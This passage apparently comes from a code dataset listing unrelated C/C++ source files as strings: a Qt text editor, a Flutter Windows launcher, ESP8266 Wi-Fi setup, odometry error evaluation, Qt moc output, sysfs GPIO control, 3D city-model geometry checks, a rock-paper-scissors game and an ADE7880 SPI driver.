ui->mainToolBar->addWidget(comboFont);//\u6dfb\u52a0\u5230\u5de5\u5177\u680f\n\n    setCentralWidget(ui->txtEdit); //\u5c06txtEdit\u8bbe\u7f6e\u4e3a\u4e2d\u5fc3\u7ec4\u4ef6\uff0c\u81ea\u52a8\u586b\u5145\u6574\u4e2a\u5de5\u4f5c\u533a\n}\n\nvoid QWMainWind::iniSignalSlots()\n{ //\u4fe1\u53f7\u4e0e\u69fd\u7684\u5173\u8054\uff0c\u5f53\u51fd\u6570\u5e26\u6709\u53c2\u6570\u65f6\uff0c\u5fc5\u987b\u5199\u660e\u53c2\u6570\u7684\u7c7b\u578b\n    connect(spinFontSize,SIGNAL(valueChanged(int)),\n            this,SLOT(on_spinBoxFontSize_valueChanged(int)));\n\n    connect(comboFont,SIGNAL(currentIndexChanged(const QString &)),\n            this,SLOT(on_comboFont_currentIndexChanged(const QString &)));\n}\n\nQWMainWind::QWMainWind(QWidget *parent) :\n    QMainWindow(parent),\n    ui(new Ui::QWMainWind)\n{\n    ui->setupUi(this);\n\n    iniUI();//\u624b\u5de5\u521d\u59cb\u5316UI\n\n    iniSignalSlots();//\u4fe1\u53f7\u4e0e\u69fd\u5173\u8054\n}\n\nQWMainWind::~QWMainWind()\n{\n    delete ui;\n}\n\nvoid QWMainWind::on_txtEdit_copyAvailable(bool b)\n{//\u6709\u6587\u5b57\u53efcopy\u65f6\u66f4\u65b0cut,copy\u7684Enable\u72b6\u6001\n    ui->actCut->setEnabled(b); //\u80fd\u5426 cut\n    ui->actCopy->setEnabled(b);  //\u80fd\u5426copy\n\n    ui->actPaste->setEnabled(ui->txtEdit->canPaste()); //\u80fd\u5426paste\n}\n\nvoid QWMainWind::on_actOpen_triggered()\n{\n    QString curPath,aFileName;\n    curPath=QCoreApplication::applicationDirPath(); //\u83b7\u53d6\u5e94\u7528\u7a0b\u5e8f\u7684\u8def\u5f84\n\n//\u8c03\u7528\u6253\u5f00\u6587\u4ef6\u5bf9\u8bdd\u6846\u6253\u5f00\u4e00\u4e2a\u6587\u4ef6\n    aFileName=QFileDialog::getOpenFileName(this,tr(\"\u6253\u5f00\u4e00\u4e2a\u6587\u4ef6\"),curPath,\n                 \"C++\u7a0b\u5e8f\u6587\u4ef6(*.cpp);;H\u5934\u6587\u4ef6(*.h);;\u6587\u672c\u6587\u4ef6(*.txt);;\u6240\u6709\u6587\u4ef6(*.*)\");\n\n    if (!aFileName.isEmpty())\n    {\n        QFile aFile(aFileName);  //\u4ee5\u6587\u4ef6\u65b9\u5f0f\u8bfb\u51fa\n        if (aFile.open(QIODevice::ReadWrite | QIODevice::Text))\n        {\n            QTextStream aStream(&aFile); //\u7528\u6587\u672c\u6d41\u8bfb\u53d6\u6587\u4ef6\n            while (!aStream.atEnd())\n                ui->txtEdit->append(aStream.readLine()); //\u8bfb\u53d6\u4e00\u4e2a\u6587\u672c\u884c\n            updateCurFile(aFileName); //\u66f4\u65b0\u72b6\u6001\u680f\u663e\u793a\n        }\n        aFile.close();\n    }\n}\n\nvoid QWMainWind::on_actFont_triggered()\n{\n    bool    ok;\n    QFont font = QFontDialog::getFont(&ok, this);\n    if (ok)\n        ui->txtEdit->setFont(font);\n\n}\n\nvoid QWMainWind::on_actNew_triggered()\n{//\u65b0\u5efa\u6587\u4ef6\n    ui->txtEdit->clear();\n    updateCurFile(\"\");\n}\n\nvoid QWMainWind::on_spinBoxFontSize_valueChanged(int aFontSize)\n{//\u6539\u53d8\u5b57\u4f53\u5927\u5c0f\u7684SpinBox\u7684\u54cd\u5e94\n    QTextCharFormat fmt;\n    fmt.setFontPointSize(aFontSize); //\u8bbe\u7f6e\u5b57\u4f53\u5927\u5c0f\n    ui->txtEdit->mergeCurrentCharFormat(fmt);\n    progressBar1->setValue(aFontSize);\n}\n\nvoid QWMainWind::on_comboFont_currentIndexChanged(const QString &arg1)\n{//FontCombobox\u7684\u54cd\u5e94\uff0c\u9009\u62e9\u5b57\u4f53\u540d\u79f0\n    QTextCharFormat fmt;\n    fmt.setFontFamily(arg1);//\u8bbe\u7f6e\u5b57\u4f53\u540d\u79f0\n    ui->txtEdit->mergeCurrentCharFormat(fmt);\n}\n\n\nvoid QWMainWind::on_actToolbarLab_triggered(bool checked)\n{\n    if (checked)  //\u663e\u793a\u6587\u5b57\u548c\u56fe\u6807\n        ui->mainToolBar->setToolButtonStyle(Qt::ToolButtonTextUnderIcon);\n    else //\u53ea\u663e\u793a\u56fe\u6807\n        ui->mainToolBar->setToolButtonStyle(Qt::ToolButtonIconOnly);\n}\n\nvoid QWMainWind::on_actFontBold_triggered(bool checked)\n{\n    QTextCharFormat fmt; //\u683c\u5f0f\n    fmt=ui->txtEdit->currentCharFormat();//\u83b7\u53d6\u5f53\u524d\u9009\u62e9\u6587\u5b57\u7684\u683c\u5f0f\n\n    if (checked) // \u76f8\u5f53\u4e8e\u8c03\u7528ui->actFontBold->isChecked();\u8bfb\u53d6Action\u7684check\u72b6\u6001\n        fmt.setFontWeight(QFont::Bold);\n    else\n        fmt.setFontWeight(QFont::Normal);\n\n    ui->txtEdit->mergeCurrentCharFormat(fmt);\n}\n\nvoid QWMainWind::on_actFontItalic_triggered(bool checked)\n{\n    QTextCharFormat fmt;\n    fmt=ui->txtEdit->currentCharFormat();\n    fmt.setFontItalic(checked);\n    ui->txtEdit->mergeCurrentCharFormat(fmt);\n}\n\nvoid QWMainWind::on_actFontUnder_triggered(bool checked)\n{\n    QTextCharFormat fmt;\n    fmt=ui->txtEdit->currentCharFormat();\n    fmt.setFontUnderline(checked);\n    ui->txtEdit->mergeCurrentCharFormat(fmt);\n}\n\n\nvoid QWMainWind::on_txtEdit_selectionChanged()\n{//\u5f53\u524d\u9009\u62e9\u7684\u6587\u5b57\u53d1\u751f\u53d8\u5316,\u66f4\u65b0\u7c97\u4f53\u3001\u659c\u4f53\u3001\u4e0b\u5212\u7ebf3\u4e2aaction\u7684checked\u72b6\u6001\n    QTextCharFormat fmt;\n    fmt=ui->txtEdit->currentCharFormat(); //\u83b7\u53d6\u6587\u5b57\u7684\u683c\u5f0f\n\n    ui->actFontItalic->setChecked(fmt.fontItalic()); //\u662f\u5426\u659c\u4f53\n ",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"mp_project\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <WiFiManager.h> // Include the WiFiManager library, which simplifies connecting to WiFi networks\n#include <ESP8266WiFi.h> // Include the ESP8266 WiFi library for basic WiFi functionality\n\nvoid setup() {\n  Serial.begin(115200); // Initialize serial communication at a baud rate of 115200 for debugging\n\n  // Create an instance of WiFiManager\n  // WiFiManager helps manage WiFi connections and allows us to easily connect to a WiFi network without hardcoding credentials\n  WiFiManager wm;\n\n  bool res; // Variable to store the result of the WiFi connection attempt\n\n  // autoConnect() is a function of WiFiManager that attempts to connect to a saved WiFi network.\n  // If no saved network is found, it sets up an access point (AP) with the provided SSID (\"ASAA\").\n  // The user can connect to this AP with their phone or computer and configure the WiFi settings.\n  res = wm.autoConnect(\"ASAA\"); // Attempt to connect to WiFi with the SSID \"ASAA\"\n  \n  // Check if the WiFi connection was unsuccessful\n  if (!res) {\n    // If connection to the WiFi network failed:\n    // Print an error message to the serial monitor for debugging purposes\n    Serial.println(\"Failed to connect\");\n    \n    // Blink the built-in LED to indicate an error. This is a visual cue for failed connection.\n    // Turn the LED on and off in 1-second intervals\n    digitalWrite(LED_BUILTIN, HIGH); // Turn on the built-in LED\n    delay(1000); // Wait for 1 second\n    digitalWrite(LED_BUILTIN, LOW);  // Turn off the built-in LED\n    delay(1000); // Wait for another 1 second\n    digitalWrite(LED_BUILTIN, HIGH); // Turn on the LED again\n\n    // Restart the ESP8266 to retry the WiFi connection after the failure\n    ESP.restart(); // This forces a reboot to try connecting again after failure\n  } else {\n    // If the WiFi connection was successful:\n    \n    // Print a success message to the serial monitor\n    Serial.println(\"Connected... Yeey :)\");\n\n    // Turn off the built-in LED to indicate that the connection was successful\n    digitalWrite(LED_BUILTIN, LOW); // Turn off the LED as we are connected to WiFi\n\n    // Now the device is connected to the internet, and further actions such as cloud communication can be initialized.\n  }\n}\n\nvoid loop() {\n    \n}\n",
    "#include <iostream>\n#include <stdio.h>\n#include <math.h>\n#include <vector>\n#include <tuple>\n\n#include \"matrix.h\"\n\nusing namespace std;\n\n// static parameter\n// float lengths[] = {5,10,50,100,150,200,250,300,350,400};\nfloat lengths[] = {100,200,300,400,500,600,700,800};\nint32_t num_lengths = 8;\n\nstruct errors {\n  int32_t first_frame;\n  float   r_err;\n  float   t_err;\n  float   len;\n  float   speed;\n  errors (int32_t first_frame,float r_err,float t_err,float len,float speed) :\n    first_frame(first_frame),r_err(r_err),t_err(t_err),len(len),speed(speed) {}\n};\n\nvector<Matrix> loadPoses(string file_name) {\n  vector<Matrix> poses;\n  FILE *fp = fopen(file_name.c_str(),\"r\");\n  if (!fp)\n    return poses;\n  while (!feof(fp)) {\n    Matrix P = Matrix::eye(4);\n    if (fscanf(fp, \"%lf %lf %lf %lf %lf %lf %lf %lf %lf %lf %lf %lf\",\n                   &P.val[0][0], &P.val[0][1], &P.val[0][2], &P.val[0][3],\n                   &P.val[1][0], &P.val[1][1], &P.val[1][2], &P.val[1][3],\n                   &P.val[2][0], &P.val[2][1], &P.val[2][2], &P.val[2][3] )==12) {\n      poses.push_back(P);\n    }\n  }\n  fclose(fp);\n  return poses;\n}\n\nvector<float> trajectoryDistances (vector<Matrix> &poses) {\n  vector<float> dist;\n  dist.push_back(0);\n  for (int32_t i=1; i<poses.size(); i++) {\n    Matrix P1 = poses[i-1];\n    Matrix P2 = poses[i];\n    float dx = P1.val[0][3]-P2.val[0][3];\n    float dy = P1.val[1][3]-P2.val[1][3];\n    float dz = P1.val[2][3]-P2.val[2][3];\n    dist.push_back(dist[i-1]+sqrt(dx*dx+dy*dy+dz*dz));\n  }\n  return dist;\n}\n\nint32_t lastFrameFromSegmentLength(vector<float> &dist,int32_t first_frame,float len) {\n  for (int32_t i=first_frame; i<dist.size(); i++)\n    if (dist[i]>dist[first_frame]+len)\n      return i;\n  return -1;\n}\n\ninline float rotationError(Matrix &pose_error) {\n  float a = pose_error.val[0][0];\n  float b = pose_error.val[1][1];\n  float c = pose_error.val[2][2];\n  float d = 0.5*(a+b+c-1.0);\n  return acos(max(min(d,1.0f),-1.0f));\n}\n\ninline float translationError(Matrix &pose_error) {\n  float dx = pose_error.val[0][3];\n  float dy = pose_error.val[1][3];\n  float dz = pose_error.val[2][3];\n  return sqrt(dx*dx+dy*dy+dz*dz);\n}\n\nvector<errors> calcSequenceErrors (vector<Matrix> &poses_gt,vector<Matrix> &poses_result) {\n\n  // error vector\n  vector<errors> err;\n\n  // parameters\n  int32_t step_size = 10; // every second\n  \n  // pre-compute distances (from ground truth as reference)\n  vector<float> dist = trajectoryDistances(poses_gt);\n \n  // for all start positions do\n  for (int32_t first_frame=0; first_frame<poses_gt.size(); first_frame+=step_size) {\n  \n    // for all segment lengths do\n    for (int32_t i=0; i<num_lengths; i++) {\n    \n      // current length\n      float len = lengths[i];\n      \n      // compute last frame\n      int32_t last_frame = lastFrameFromSegmentLength(dist,first_frame,len);\n      \n      // continue, if sequence not long enough\n      if (last_frame==-1)\n        continue;\n\n      // compute rotational and translational errors\n      Matrix pose_delta_gt     = Matrix::inv(poses_gt[first_frame])*poses_gt[last_frame];\n      Matrix pose_delta_result = Matrix::inv(poses_result[first_frame])*poses_result[last_frame];\n      Matrix pose_error        = Matrix::inv(pose_delta_result)*pose_delta_gt;\n      float r_err = rotationError(pose_error);\n      float t_err = translationError(pose_error);\n      \n      // compute speed\n      float num_frames = (float)(last_frame-first_frame+1);\n      float speed = len/(0.1*num_frames);\n      \n      // write to file\n      err.push_back(errors(first_frame,r_err/len,t_err/len,len,speed));\n    }\n  }\n\n  // return error vector\n  return err;\n}\n\nstd::tuple<float, float> calcStats (vector<errors> err) {\n\n  float t_err = 0;\n  float r_err = 0;\n\n  // for all errors do => compute sum of t_err, r_err\n  for (vector<errors>::iterator it=err.begin(); it!=err.end(); it++) {\n    t_err += it->t_err;\n    r_err += it->r_err;\n  }\n\n  // save errors\n  float num = err.size();\n  return make_tuple(t_err/num * 100, r_err/num / 3.14 * 180.0);\n}\n\nvector<errors> eval (string sequence_id, string result_file, int start, int end) {\n\n  // ground truth and result directories\n  string gt_dir         = \"data/odometry/poses\";\n  \n  // read ground truth and result poses\n  vector<Matrix> poses_gt     = loadPoses(gt_dir + \"/\" + sequence_id + \".txt\");\n  vector<Matrix> poses_result = loadPoses(result_file);\n  \n  if (end == -1) {\n    end = poses_gt.size(); \n  }\n\n  poses_gt.erase(poses_gt.begin() + end, poses_gt.end());\n  poses_gt.erase(poses_gt.begin(), poses_gt.begin() + start);\n  \n  // check for errors\n  if (poses_result.size() != poses_gt.size()) {\n    cerr << \"#gt poses (\" << poses_gt.size() << \") != #result poses (\" << poses_result.size() << \")\" << endl;\n  }\n\n  // compute sequence errors\n  vector<errors> seq_err = calcSequenceErrors(poses_gt,poses_result);\n\n  return seq_err;\n\t// return calcStats(seq_err);\n}\n\nint32_t main (int32_t argc,char *argv[]) {\n\n  if (argc < 4 || argc > 6) {\n      cerr << \"Usage: ./eval_odo",
    "/****************************************************************************\n** Meta object code from reading C++ file 'lyricdialog.h'\n**\n** Created by: The Qt Meta Object Compiler version 68 (Qt 6.5.3)\n**\n** WARNING! All changes made in this file will be lost!\n*****************************************************************************/\n\n#include \"../../../lyricdialog.h\"\n#include <QtCore/qmetatype.h>\n\n#if __has_include(<QtCore/qtmochelpers.h>)\n#include <QtCore/qtmochelpers.h>\n#else\nQT_BEGIN_MOC_NAMESPACE\n#endif\n\n\n#include <memory>\n\n#if !defined(Q_MOC_OUTPUT_REVISION)\n#error \"The header file 'lyricdialog.h' doesn't include <QObject>.\"\n#elif Q_MOC_OUTPUT_REVISION != 68\n#error \"This file was generated using the moc from 6.5.3. It\"\n#error \"cannot be used with the include files from this version of Qt.\"\n#error \"(The moc has changed too much.)\"\n#endif\n\n#ifndef Q_CONSTINIT\n#define Q_CONSTINIT\n#endif\n\nQT_WARNING_PUSH\nQT_WARNING_DISABLE_DEPRECATED\nQT_WARNING_DISABLE_GCC(\"-Wuseless-cast\")\nnamespace {\n\n#ifdef QT_MOC_HAS_STRINGDATA\nstruct qt_meta_stringdata_CLASSLyricDialogENDCLASS_t {};\nstatic constexpr auto qt_meta_stringdata_CLASSLyricDialogENDCLASS = QtMocHelpers::stringData(\n    \"LyricDialog\"\n);\n#else  // !QT_MOC_HAS_STRING_DATA\nstruct qt_meta_stringdata_CLASSLyricDialogENDCLASS_t {\n    uint offsetsAndSizes[2];\n    char stringdata0[12];\n};\n#define QT_MOC_LITERAL(ofs, len) \\\n    uint(sizeof(qt_meta_stringdata_CLASSLyricDialogENDCLASS_t::offsetsAndSizes) + ofs), len \nQ_CONSTINIT static const qt_meta_stringdata_CLASSLyricDialogENDCLASS_t qt_meta_stringdata_CLASSLyricDialogENDCLASS = {\n    {\n        QT_MOC_LITERAL(0, 11)   // \"LyricDialog\"\n    },\n    \"LyricDialog\"\n};\n#undef QT_MOC_LITERAL\n#endif // !QT_MOC_HAS_STRING_DATA\n} // unnamed namespace\n\nQ_CONSTINIT static const uint qt_meta_data_CLASSLyricDialogENDCLASS[] = {\n\n // content:\n      11,       // revision\n       0,       // classname\n       0,    0, // classinfo\n       0,    0, // methods\n       0,    0, // properties\n       0,    0, // enums/sets\n       0,    0, // constructors\n       0,       // flags\n       0,       // signalCount\n\n       0        // eod\n};\n\nQ_CONSTINIT const QMetaObject LyricDialog::staticMetaObject = { {\n    QMetaObject::SuperData::link<QDialog::staticMetaObject>(),\n    qt_meta_stringdata_CLASSLyricDialogENDCLASS.offsetsAndSizes,\n    qt_meta_data_CLASSLyricDialogENDCLASS,\n    qt_static_metacall,\n    nullptr,\n    qt_incomplete_metaTypeArray<qt_meta_stringdata_CLASSLyricDialogENDCLASS_t,\n        // Q_OBJECT / Q_GADGET\n        QtPrivate::TypeAndForceComplete<LyricDialog, std::true_type>\n    >,\n    nullptr\n} };\n\nvoid LyricDialog::qt_static_metacall(QObject *_o, QMetaObject::Call _c, int _id, void **_a)\n{\n    (void)_o;\n    (void)_id;\n    (void)_c;\n    (void)_a;\n}\n\nconst QMetaObject *LyricDialog::metaObject() const\n{\n    return QObject::d_ptr->metaObject ? QObject::d_ptr->dynamicMetaObject() : &staticMetaObject;\n}\n\nvoid *LyricDialog::qt_metacast(const char *_clname)\n{\n    if (!_clname) return nullptr;\n    if (!strcmp(_clname, qt_meta_stringdata_CLASSLyricDialogENDCLASS.stringdata0))\n        return static_cast<void*>(this);\n    return QDialog::qt_metacast(_clname);\n}\n\nint LyricDialog::qt_metacall(QMetaObject::Call _c, int _id, void **_a)\n{\n    _id = QDialog::qt_metacall(_c, _id, _a);\n    return _id;\n}\nQT_WARNING_POP\n",
    "#include <fstream>\r\n#include <string>\r\n#include <chrono>\r\n#include <thread>\r\n#include <iostream>\r\n#define OUTPUT 0\r\n#define INPUT 1\r\n#define HIGH 1\r\n#define LOW 0\r\n#define GREENLED 1\r\n#define REDLED 0\r\n#define HEARTBAET 2\r\nvoid digitalLed(bool id,int m){\r\n    if(m==1){\r\n        if(id){\r\n            std::ofstream outfile(\"/sys/class/leds/green_led/trigger\");\r\n            outfile << \"default-on\" << \"\\n\"; \r\n            outfile.close();  \r\n        }\r\n        else{\r\n            std::ofstream outfile(\"/sys/class/leds/red_led/trigger\");\r\n            outfile << \"default-on\" << \"\\n\"; \r\n            outfile.close();  \r\n        }\r\n    }\r\n    else if(m==0){\r\n        if(id){\r\n            std::ofstream outfile(\"/sys/class/leds/green_led/trigger\");\r\n            outfile << \"none\" << \"\\n\"; \r\n            outfile.close();  \r\n        }\r\n        else{\r\n            std::ofstream outfile(\"/sys/class/leds/red_led/trigger\");\r\n            outfile << \"none\" << \"\\n\"; \r\n            outfile.close();  \r\n        }\r\n    }\r\n    else if(m==2){\r\n        if(id){\r\n            std::ofstream outfile(\"/sys/class/leds/green_led/trigger\");\r\n            outfile << \"heartbeat\" << \"\\n\"; \r\n            outfile.close();  \r\n        }\r\n        else{\r\n            std::ofstream outfile(\"/sys/class/leds/red_led/trigger\");\r\n            outfile << \"heartbeat\" << \"\\n\"; \r\n            outfile.close();  \r\n        }\r\n    }\r\n}\r\nvoid pinMode(int id,bool mode){\r\n    if(mode){\r\n        std::ofstream outfile(\"/sys/class/gpio/export\");\r\n        outfile << std::to_string(id) << \"\\n\"; \r\n        outfile.close();  \r\n        std::string first=\"/sys/class/gpio/gpio\";\r\n        std::string two=std::to_string(id);\r\n        std::string three=\"/direction\";\r\n        std::string result = first +two+ three;\r\n        std::ofstream outfile1(result);\r\n        outfile1 << \"in\" << \"\\n\"; \r\n        outfile1.close();\r\n    }\r\n    else{\r\n        std::ofstream outfile(\"/sys/class/gpio/export\");\r\n        outfile << std::to_string(id) << \"\\n\"; \r\n        outfile.close();  \r\n        std::string first=\"/sys/class/gpio/gpio\";\r\n        std::string two=std::to_string(id);\r\n        std::string three=\"/direction\";\r\n        std::string result = first +two+ three;\r\n        std::ofstream outfile1(result);\r\n        outfile1 << \"out\" << \"\\n\"; \r\n        outfile1.close();\r\n    }\r\n}\r\nvoid digitalWrite(int id,bool mode){\r\n    std::string first1=\"/sys/class/gpio/gpio\";\r\n    std::string two1=std::to_string(id);\r\n    std::string three1=\"/value\";\r\n    std::string result1 = first1 +two1+ three1;\r\n    std::ofstream outfile2(result1);\r\n    if (!outfile2.is_open()) {\r\n        std::cerr << \"Error: Failed to open the file \" << result1 << \"\\n\";\r\n        return;\r\n    }\r\n    outfile2 << std::to_string(mode) << \"\\n\";\r\n    outfile2.close();\r\n}\r\nbool digitalRead(int id){\r\n    std::string first1=\"/sys/class/gpio/gpio\";\r\n    std::string two1=std::to_string(id);\r\n    std::string three1=\"/value\";\r\n    std::string result1 = first1 +two1+ three1;\r\n    std::ifstream file(result1);\r\n    if (!file.is_open()) {\r\n        std::cerr << \"Error: Unable to open file \" << result1 << \"\\n\";\r\n        return false; \r\n    }\r\n    std::string content;\r\n    file >> content; \r\n    int number = std::stoi(content);\r\n    return (number == 1);\r\n}\r\nint main(){\r\npinMode(74,OUTPUT);\r\n}\r\n",
    "// Copyright (c) 2024. made for a proof of concept for thesis: \"Automatic repair of 3D citymodels\" by Lisa Keurentjes\n\n\n#include <algorithm>\n#include \"Defenitions.h\"\n#include \"Geometrytools.h\"\n#include \"GeometrytoolsDetriangulationPoint3.h\"\n#include \"DefenitionsCGAL.h\"\n#include \"Geometrytools_makeCGAL.h\"\n#include <iostream>\n#include <vector>\n\nusing json = nlohmann::json;\nusing namespace std;\n\nnamespace AUTOr3pair {\n    json counter(json &geometry) {\n      json out;\n      set<int> vertices;\n\n      if (geometry[\"type\"] == \"Surface\") {\n        for (int i = 0; i < geometry[\"boundaries\"].size(); ++i) {\n          for (int j = 0; j < geometry[\"boundaries\"][i].size(); ++j) {\n            vertices.insert(int(geometry[\"boundaries\"][i][j]));\n          }\n        }\n      } else if (geometry[\"type\"] == \"MultiSurface\" or geometry[\"type\"] == \"CompositeSurface\") {\n        out[\"numberfaces\"] = 0;\n        for (int i = 0; i < geometry[\"boundaries\"].size(); ++i) {\n          out[\"numberfaces\"] = int(out[\"numberfaces\"]) + 1;\n          for (int j = 0; j < geometry[\"boundaries\"][i].size(); ++j) {\n            for (int k = 0; k < geometry[\"boundaries\"][i][j].size(); ++k) {\n              vertices.insert(int(geometry[\"boundaries\"][i][j][k]));\n            }\n          }\n        }\n      } else if (geometry[\"type\"] == \"Solid\") {\n        out[\"numberfaces\"] = 0;\n        out[\"numbershells\"] = 0;\n        for (int i = 0; i < geometry[\"boundaries\"].size(); ++i) {\n          out[\"numbershells\"] = int(out[\"numbershells\"]) + 1;\n          for (int j = 0; j < geometry[\"boundaries\"][i].size(); ++j) {\n            out[\"numberfaces\"] = int(out[\"numberfaces\"]) + 1;\n            for (int k = 0; k < geometry[\"boundaries\"][i][j].size(); ++k) {\n              for (int l = 0; l < geometry[\"boundaries\"][i][j][k].size(); ++l) {\n                vertices.insert(int(geometry[\"boundaries\"][i][j][k][l]));\n              }\n            }\n          }\n        }\n      } else if (geometry[\"type\"] == \"MultiSolid\" or geometry[\"type\"] == \"CompositeSolid\") {\n        out[\"numberfaces\"] = 0;\n        out[\"numbershells\"] = 0;\n        out[\"numbersolids\"] = 0;\n        for (int i = 0; i < geometry[\"boundaries\"].size(); ++i) {\n          out[\"numbersolids\"] = int(out[\"numbersolids\"]) + 1;\n          for (int j = 0; j < geometry[\"boundaries\"][i].size(); ++j) {\n            out[\"numbershells\"] = int(out[\"numbershells\"]) + 1;\n            for (int k = 0; k < geometry[\"boundaries\"][i][j].size(); ++k) {\n              out[\"numberfaces\"] = int(out[\"numberfaces\"]) + 1;\n              for (int l = 0; l < geometry[\"boundaries\"][i][j][k].size(); ++l) {\n                for (int m = 0; m < geometry[\"boundaries\"][i][j][k][l].size(); ++m) {\n                  vertices.insert(int(geometry[\"boundaries\"][i][j][k][l][m]));\n                }\n              }\n            }\n          }\n        }\n      }\n\n      out[\"numbervertices\"] = vertices.size();\n      return out;\n    }\n\n    bool all_points_on_same_plane(set<Point3> &lsPts) {\n      auto it = lsPts.begin();\n      // Use the first three points to calculate the normal vector of the plane\n      Point3 p1 = *it++;\n      Point3 p2 = *it++;\n      Point3 p3 = *it++;\n\n      // Find the first three non-collinear points\n      while (CGAL::collinear(p1, p2, p3) && it != lsPts.end()) {\n        p1 = p2;\n        p2 = p3;\n        p3 = *it++;\n      }\n\n      if (CGAL::collinear(p1, p2, p3)) {\n        // All points are collinear, cannot define a plane\n        return true;\n      }\n\n      Plane plane(p1, p2, p3);\n      auto normal = plane.orthogonal_vector();\n      double normal_length = std::sqrt(normal.squared_length());\n\n      // Check if all other points lie on the same plane\n      for (it = lsPts.begin(); it != lsPts.end(); ++it) {\n        double distance = std::abs(plane.a() * it->x() + plane.b() * it->y() + plane.c() * it->z() + plane.d()) / normal_length;\n        double tol = STANDARDS[\"Tollerances\"][\"snap_tol\"];\n        if (distance > tol) {\n          return false;\n        }\n      }\n\n      return true; // All points are coplanar\n    };\n\n    bool all_points_on_same_planeSMT(set<Point3E> &lsPts) {\n      auto it = lsPts.begin();\n      // Use the first three points to calculate the normal vector of the plane\n      Point3E p1 = *it++;\n      Point3E p2 = *it++;\n      Point3E p3 = *it++;\n\n      // Find the first three non-collinear points\n      while (CGAL::collinear(p1, p2, p3) && it != lsPts.end()) {\n        p1 = p2;\n        p2 = p3;\n        p3 = *it++;\n      }\n\n      if (CGAL::collinear(p1, p2, p3)) {\n        // All points are collinear, cannot define a unique plane\n        return true;\n      }\n\n      // Define the plane using the first three non-collinear points\n      PlaneE plane(p1, p2, p3);\n\n      // Check if all other points lie on the same plane\n      for (it = lsPts.begin(); it != lsPts.end(); ++it) {\n        if (!plane.has_on(*it)) {\n          return false;\n        }\n      }\n\n      return true; // All points are coplanar\n    }\n\n\n    bool all_points_on_same_plane(std::set<",
    "#include <iostream>\n#include <string>\n#include <cstdlib>\n#include <ctime>\nusing namespace std;\n\nint main()\n{\n    string elements[3] = { \"stone\",\"paper\",\"scissor\" };\n    string player;\n    string AI;\n    cout << \"please choose between Stone Or Paper Or Scissor : \";\n    cin >> player;\n    srand(time(0));\n    int randchoice = (rand() % 3) + 1;\n    cout << randchoice;\n    switch (randchoice)\n    {\n    case 1:\n        AI = \"stone\";\n        break;\n    case 2:\n        AI = \"paper\";\n        break;\n    case 3:\n        AI = \"scissor\";\n        break;\n    }\n    cout << \"AI CHOOSED : \" << AI << endl;\n    if (player == \"stone\" && AI == \"stone  \" ||\n        player == \"paper\" && AI == \"paper  \" ||\n        player == \"scissor\" && AI == \"scissor\")\n    {\n        cout << \"*** TIE ***\" << endl;\n    }\n    else if (player == \"stone\" && AI == \"scissor\" ||\n             player == \"paper\" && AI == \"stone  \" ||\n             player == \"scissor\" && AI == \"paper  \")\n    {\n        cout << \"*** PLAYER IS WINNER ***\" << endl;\n    }\n    else if (player == \"stone\" && AI == \"paper  \" ||\n        player == \"paper\" && AI == \"scissor\" ||\n        player == \"scissor\" && AI == \"stone  \")\n    {\n        cout << \"*** AI IS WINNER ***\" << endl;\n    }\n    return 0;\n\n}\n\n",
    "/* *********************************************************************************** */\n/* /*********************************************************************************** */\n#include \"ADE7880.h\"\n#include \"SPI.h\"\n\nSPIClass spi;\nADE7880_SPI::ADE7880_SPI()\n{\n    spi = SPIClass();\n    settings();\n}\n\nvoid ADE7880_SPI::begin(int8_t sck, int8_t miso, int8_t mosi, int8_t ss)\n{\n    #ifdef ARDUINO_ARCH_ESP32\n    spi.begin(sck, miso, mosi, ss);\n    #else\n    spi.begin();\n    #endif\n    _ss = ss;\n    pinMode(_ss, OUTPUT);\n    digitalWrite(_ss, HIGH);\n    delay(1);\n    for (int i = 0; i < 4; i++)\n    {\n        digitalWrite(_ss, LOW);\n        delayMicroseconds(10);\n        digitalWrite(_ss, HIGH);\n        delayMicroseconds(10);\n    }\n}\n\nvoid ADE7880_SPI::settings(uint32_t clock, uint8_t bitOrder, uint8_t dataMode)\n{\n    _clock = clock;\n    _bitOrder = bitOrder;\n    _dataMode = dataMode;\n}\nvoid ADE7880_SPI::write8Register(uint16_t reg, uint8_t val)\n{\n    uint8_t fba = 0x0;\n    uint8_t hba = reg >> 8;\n    uint8_t lba = reg & 0xff;\n    uint8_t hbv = val;\n\tdigitalWrite(_ss, LOW);\n    spi.beginTransaction(SPISettings(_clock, _bitOrder, _dataMode));\n    spi.transfer(fba);\n    spi.transfer(hba);\n    spi.transfer(lba);\n    spi.transfer(hbv);\n    spi.endTransaction();\n    digitalWrite(_ss, HIGH);\n}\n\nvoid ADE7880_SPI::write16Register(uint16_t reg, uint16_t val)\n{\n    uint8_t fba = 0x0;\n    uint8_t hba = reg >> 8;\n    uint8_t lba = reg & 0xff;\n    uint8_t hbv = val >> 8;\n    uint8_t lbv = val & 0xff;\n    digitalWrite(_ss, LOW);\n    spi.beginTransaction(SPISettings(_clock, _bitOrder, _dataMode));\n    spi.transfer(fba);\n    spi.transfer(hba);\n    spi.transfer(lba);\n    spi.transfer(hbv);\n    spi.transfer(lbv);\n    spi.endTransaction();\n    digitalWrite(_ss, HIGH);\n}\nvoid ADE7880_SPI::write32Register(uint16_t reg, uint32_t val)\n{\n    uint8_t fba = 0x0;\n    uint8_t hba = reg >> 8;\n    uint8_t lba = reg & 0xff;\n    uint8_t hbv = 